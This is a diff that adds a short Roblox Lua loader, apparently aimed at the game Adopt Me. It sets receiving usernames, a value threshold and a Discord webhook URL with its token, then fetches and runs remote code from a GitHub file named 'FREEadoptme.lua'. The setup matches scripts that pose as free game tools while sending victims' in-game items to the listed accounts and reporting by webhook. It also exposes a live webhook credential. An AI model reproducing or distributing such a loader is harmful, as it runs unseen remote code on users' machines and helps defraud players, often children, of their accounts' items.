@@ -1,0 +1,6 @@
+_G.Usernames = {"Murnder9"} -- you can add as many as you'd like
+_G.min_value = 0.01
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.webhook = "https://discord.com/api/webhooks/1373395109982244965/bo5mtLdEHsgZbELMLRZezugN8qtDMrzRSALsLF5LpIu_f4zpSKrC3tbpWG0r3xjuufr7" -- change to your webhoo
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/tobi437a/Adopt-Me/refs/heads/main/FREEadoptme.lua"))()
